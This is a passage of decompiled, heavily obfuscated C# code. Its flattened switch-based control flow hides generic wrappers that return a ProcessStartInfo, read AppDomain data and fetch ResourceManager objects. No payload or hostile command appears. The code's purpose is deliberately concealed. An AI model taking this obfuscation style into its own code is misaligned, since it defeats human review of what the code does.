						goto case 3;
					case 1:
						num2 = 2;
						goto case 2;
					default:
						num2 = 4;
						break;
					case 4:
					case 6:
						break;
					case 8:
						return (ProcessStartInfo)obj;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num4 = default(int);
			Class25.smethod_9(exception_, num, obj, num3, num4, num2, byte_, object_0, short_0, int_1);
			throw;
		}
	}

	internal static object smethod_1<T, U>(object object_0, object object_1, int int_1, int int_2) where T : AppDomain where U : string
	{
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		int num = default(int);
		int num2 = default(int);
		object obj = default(object);
		int num3 = default(int);
		int num4 = default(int);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			while (true)
			{
				num = 0;
				num2 = char_[23] - 2893;
				while (true)
				{
					switch (num2)
					{
					default:
						num2 = byte_[265];
						continue;
					case 5:
					case 8:
						switch (((int_2 ^ int_1) - 101) ^ num)
						{
						case 0:
							goto IL_0090;
						}
						num2 = 0;
						goto case 0;
					case 0:
						obj = null;
						num2 = char_[275] - 57094;
						continue;
					case 1:
					case 7:
						num2 = 5;
						goto case 5;
					case 6:
						break;
					case 3:
						obj = ((AppDomain)object_0).GetData((string)object_1);
						num2 = 4;
						goto case 4;
					case 4:
						num++;
						num3 = 3408;
						num4 = 418;
						num2 = 9;
						goto case 2;
					case 2:
					case 9:
						{
							return obj;
						}
						IL_0090:
						num2 = 3;
						goto case 3;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num5 = default(int);
			Class25.smethod_11(exception_, new object[12]
			{
				num, obj, num3, num4, num5, num2, byte_, char_, object_0, object_1,
				int_1, int_2
			});
			throw;
		}
	}

	internal static object smethod_2<T, U>(object object_0, object object_1, short short_0, char char_0) where T : ResourceManager where U : string
	{
		char[] char_ = default(char[]);
		byte[] byte_ = default(byte[]);
		int num = default(int);
		int num2 = default(int);
		object obj = default(object);
		int num3 = default(int);
		int num4 = default(int);
		try
		{
			char_ = Class45.char_0;
			byte_ = Class35.byte_1;
			while (true)
			{
				num = 0;
				num2 = 4;
				while (true)
				{
					num2 = (((short_0 ^ char_0) - 43) ^ num) switch
					{
						0 => char_[279] - 30732, 
						_ => char_[19] - 47552, 
					};
					switch (num2)
					{
					case 5:
						num2 = 4;
						continue;
					case 1:
					case 11:
						num2 = 4;
						continue;
					case 4:
						continue;
					default:
						num2 = 7;
						break;
					case 7:
						break;
					case 9:
						obj = ((ResourceManager)object_0).GetObject((string)object_1);
						num2 = 0;
						goto case 0;
					case 10:
						obj = null;
						num2 = 0;
						goto case 0;
					case 0:
					case 6:
						num++;
						num3 = 813;
						num4 = 976;
						num2 = 8;
						goto case 3;
					case 3:
					case 8:
						return obj;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num5 = default(int);
			Class25.smethod_11(exception_, new object[12]
			{
				num, obj, num4, num3, num5, num2, char_, byte_, object_0, object_1,
				short_0, char_0
			});
			throw;
		}
	}
}
